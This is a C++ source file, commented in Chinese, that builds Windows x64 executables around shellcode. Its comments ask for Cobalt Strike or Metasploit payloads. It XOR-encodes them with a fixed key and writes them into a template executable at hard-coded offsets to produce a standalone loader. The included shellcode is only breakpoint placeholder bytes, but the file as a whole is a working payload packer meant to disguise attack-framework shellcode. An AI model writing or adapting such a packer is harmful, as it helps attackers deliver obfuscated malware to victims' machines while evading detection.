//本框架只支持x64shellcode生成！！！！！！！！！
#include <Windows.h>

#define MAX_SIZE 0x1000
#define MAX_SHELLCODE_SIZE 0x3A5    //shellcode最大长度
#define KEY 0x61    //异或加密密钥

//直接放入cs/msf生成或自写的shellcode(未加密)，注意大小不要超过0x3A5字节
BYTE shellcode[] = "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC";

int main()
{
    BOOL bRet = FALSE;
    BYTE chBuffer[MAX_SIZE];
    DWORD dwReadSize = 0;
    DWORD dwWritenSize = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    if (sizeof(shellcode) > MAX_SHELLCODE_SIZE)
    {
        OutputDebugString(TEXT("Shellcode Too Bigggggggggggggg!!!!!!!!!!!\r\n"));
        return -1;
    }

    for (size_t i = 0; i < sizeof(shellcode); i++)
    {
        shellcode[i] = shellcode[i] ^ KEY;
    }

    hFile = ::CreateFile(TEXT("matrix.exe"),    //母体文件
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        OutputDebugString(TEXT("CreateFile fail!\r\n"));
        return 0;
    }

    ::ZeroMemory(chBuffer, MAX_SIZE);
    bRet = ::ReadFile(hFile, chBuffer, MAX_SIZE, &dwReadSize, NULL);
    if (bRet)
    {
        OutputDebugString(TEXT("ReadFile success!\r\n"));
    }
    else
    {
        DWORD dwError = GetLastError();         
        TCHAR chErrorBuf[1024];
        wsprintf(chErrorBuf, TEXT("GetLastError()=%d\r\n"), dwError);
        OutputDebugString(chErrorBuf);
    }
    CloseHandle(hFile);
    hFile = NULL;

    /////////////////////////////////////////////////////////////////////
    
    chBuffer[0x430] = KEY;
    *(DWORD*)&chBuffer[0x41D] = sizeof(shellcode);
    *(DWORD*)&chBuffer[0x438] = sizeof(shellcode);
    __movsb(&chBuffer[0x44B], shellcode, sizeof(shellcode));
    
    /////////////////////////////////////////////////////////////////////

    hFile = ::CreateFile(TEXT("demo.exe"),  //生成的shellcode可执行文件
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,      
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        OutputDebugString(TEXT("CreateFile fail!\r\n"));
        return 0;
    }

    bRet = ::WriteFile(hFile, chBuffer, dwReadSize, &dwWritenSize, NULL);
    if (bRet)
    {
        OutputDebugString(TEXT("WriteFile success!\r\n"));
    }
    CloseHandle(hFile);

    return 0;
}